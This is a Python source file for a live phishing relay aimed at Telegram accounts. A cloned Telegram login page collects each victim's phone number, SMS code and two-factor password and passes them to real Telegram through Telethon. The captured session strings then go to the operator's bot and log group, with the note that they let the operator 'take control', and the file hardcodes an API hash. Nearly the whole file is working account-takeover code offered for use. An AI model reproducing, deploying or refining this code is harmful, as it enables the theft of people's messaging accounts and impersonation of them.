import os
import asyncio
import telebot
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION (Koyeb Env Vars) ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
SESSION_STRING = os.environ.get("SESSION_STRING")
# Ensure GROUP_ID is an integer for telebot comparisons
try:
    GROUP_ID = int(os.environ.get("GROUP_ID", 0))
except:
    GROUP_ID = 0

# Initialize both frameworks
bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Dictionary to hold live client objects and their data
# Structure: { "phone": {"client": TelegramClient, "hash": str} }
active_relays = {}

# --- TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "🤖 <b>VinzyStore Control Unit Active.</b>\n\n"
                    "Commands:\n"
                    "• <code>.get [phone]</code> - Check if session is still alive\n"
                    "• <code>.info</code> - Server Status", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.get'))
def get_account_info(m):
    # Security: Only works in your private log group
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return

    try:
        parts = m.text.split(' ')
        if len(parts) < 2:
            return bot.reply_to(m, "❌ Usage: <code>.get +855XXXXXXXX</code>", parse_mode="HTML")
        
        target_phone = parts[1]
        
        if target_phone in active_relays:
            relay = active_relays[target_phone]
            if relay['client'].is_connected():
                bot.reply_to(m, f"✅ <b>Session Active:</b> {target_phone}\n"
                                f"The relay is currently holding this target in memory.", parse_mode="HTML")
            else:
                bot.reply_to(m, f"⚠️ <b>Session Offline:</b> {target_phone} is in memory but disconnected.")
        else:
            bot.reply_to(m, f"❌ <b>No Active Relay</b> found for {target_phone}.\n"
                            f"You must use the session string from your logs to log in manually.", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}")

# --- WEB ROUTES (Live Mirror Logic) ---

@app.route('/')
async def index():
    """Serves the 100% Telegram Clone UI."""
    tid = request.args.get('id', 'Admin')
    return await render_template('login.html', tid=tid)

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """Step 1: Victim enters phone, we trigger the REAL Telegram SMS."""
    data = await request.json
    phone = data.get('phone')
    tid = data.get('tid')

    # Create a unique client for this specific login attempt
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()

    try:
        # Trigger the official SMS from Telegram
        sent_code = await client.send_code_request(phone)
        
        # Save the client and the phone_code_hash to use in the next step
        active_relays[phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash
        }

        # Notify your Telegram Bot
        bot.send_message(tid, f"🎯 <b>Target Hit!</b>\n"
                              f"👤 Phone: <code>{phone}</code>\n"
                              f"💬 Status: <b>SMS Sent</b>", parse_mode="HTML")
        return jsonify({"status": "success"})
    
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """Step 2: Victim enters the 5-digit SMS code."""
    data = await request.json
    phone = data.get('phone')
    code = data.get('code')
    tid = data.get('tid')

    if phone not in active_relays:
        return jsonify({"status": "error", "msg": "Session expired. Please restart."})

    relay = active_relays[phone]
    client = relay["client"]

    try:
        # Submit the code to the real Telegram
        await client.sign_in(phone, code, phone_code_hash=relay["hash"])
        
        # SUCCESS! Generate the Session String for the victim's account
        victim_session = client.session.save()
        
        log_msg = (
            f"💰 <b>ACCOUNT CAPTURED!</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>Session String:</b>\n<code>{victim_session}</code>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"<i>Paste this string into a Telethon client to take control.</i>"
        )
        bot.send_message(tid, log_msg, parse_mode="HTML")
        if GROUP_ID:
            bot.send_message(GROUP_ID, log_msg, parse_mode="HTML")

        return jsonify({"status": "success"})

    except errors.SessionPasswordNeededError:
        # User has 2FA enabled
        bot.send_message(tid, f"🛡️ <b>2FA Detected</b> for {phone}.\nTarget is currently at the password screen.", parse_mode="HTML")
        return jsonify({"status": "2fa_needed"})
    
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    """Step 3: Victim enters their Cloud Password (2FA)."""
    data = await request.json
    phone = data.get('phone')
    password = data.get('password')
    tid = data.get('tid')

    if phone not in active_relays:
        return jsonify({"status": "error", "msg": "Session expired."})

    client = active_relays[phone]["client"]

    try:
        await client.sign_in(password=password)
        victim_session = client.session.save()

        log_msg = (
            f"🔓 <b>2FA BYPASSED!</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>Full Access Session:</b>\n<code>{victim_session}</code>\n"
            f"━━━━━━━━━━━━━━━"
        )
        bot.send_message(tid, log_msg, parse_mode="HTML")
        if GROUP_ID:
            bot.send_message(GROUP_ID, log_msg, parse_mode="HTML")
            
        return jsonify({"status": "success"})
    
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- BACKGROUND BOT POLLING ---

def run_bot():
    """Runs the Telegram Bot listener in a separate thread."""
    print("Bot Polling Started...")
    bot.remove_webhook()
    bot.polling(none_stop=True)

# --- STARTUP ---

if __name__ == "__main__":
    # Start the Telegram Bot thread
    Thread(target=run_bot, daemon=True).start()
    
    # Start the Quart Web Server
    # On Koyeb, this will be managed by Gunicorn/Hypercorn
    app.run(host="0.0.0.0", port=8000)
